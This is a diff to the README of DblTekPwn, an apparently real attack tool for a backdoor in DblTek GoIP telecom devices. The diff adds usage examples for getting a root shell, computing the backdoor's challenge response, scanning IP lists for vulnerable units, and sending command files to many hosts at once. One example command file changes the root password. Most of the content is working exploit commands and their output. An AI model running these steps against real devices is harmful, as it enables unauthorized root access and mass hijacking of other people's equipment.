@@ -69,11 +69,51 @@ USAGE: DblTekPwn.exe [MODE] [HOSTS] [OUTPUT]
 
 ## Examples
 
+### Getting a Root Shell on a Vulnerable System
+
+DblTekGoIPPwn makes it easy to simply get a root shell on any vulnerable system. Simply run the
+following command using the vulnerable IP.
+
+```
+DblTekPwn.exe --root-shell --name 192.168.1.1
+```
+
+You will see output that looks like this:
+```
+Trying 192.168.1.1...
+Connected to 192.168.1.1.
+Escape character is '^]'.
+
+
+Start login
+do exec: /sbin/login
+Login: dbladm
+challenge: N1746203308
+Password: ***********
+
+```
+
+From here you can simply begin entering commands.
+
+### Calculating a Challenge Response
+
+Say you simply wanted to calculate the response to a GoIP challenge ```N1746203308```. Simply
+run the following command.
+
+```
+DblTekPwn --compute-response N1746203308
+```
+
+The output will be the response:
+```
+d6176d3aab2
+```
+
 ### Checking a List of IPs
 
-Say you wished to check ```list.txt``` of IPs for GoIPs that are vulnerable, and send this output
+Say you wished to check ```list.txt``` of IPs for GoIPs that are vulnerable and send this output
 to ```results.txt```. First make sure that the IPs are in format ```ip:port``` (port is default 23)
-and that the IPs are seperated by a newline ```\n```. The following command could then ran.
+and that the IPs are seperated by a newline ```\n```. The following command could then be ran.
 
 ```
 DblTekPwn.exe --test --file list.txt --output results.txt
@@ -97,5 +137,46 @@ results.txt:
 192.168.1.4:2323 False
 ```
 
+The ```False``` or ```True``` after the host indicates whether or not the IP is vulnerable.
+
 ### Sending Commands to a List of IPs
 
+Say you had a list of commands (which is really a list of telnet inputs) in ```cmds.txt```
+to send to ```list.txt``` of IPs and send the output to ```results.txt```. First make sure
+that the IPs are in format ```ip:port``` (port is default 23) and that BOTH the IPs AND commands
+are seperated by a newline ```\n``` in their respective files. The following command could then
+be ran.
+
+```
+DblTekPwn.exe --send-commands cmds.txt --file list.txt --output results.txt
+```
+
+list.txt:
+```
+192.168.1.0
+192.168.1.1
+192.168.1.2:1337
+192.168.1.3
+192.168.1.4:2323
+```
+
+cmds.txt:
+```
+passwd root
+toor
+toor
+
+exit
+```
+
+results.txt:
+```
+192.168.1.0 False
+192.168.1.1 True
+192.168.1.2:1337 True
+192.168.1.3 False
+192.168.1.4:2323 False
+```
+
+The ```False``` or ```True``` after the host indicates whether or not the connection was successfully
+made and the commands delivered.
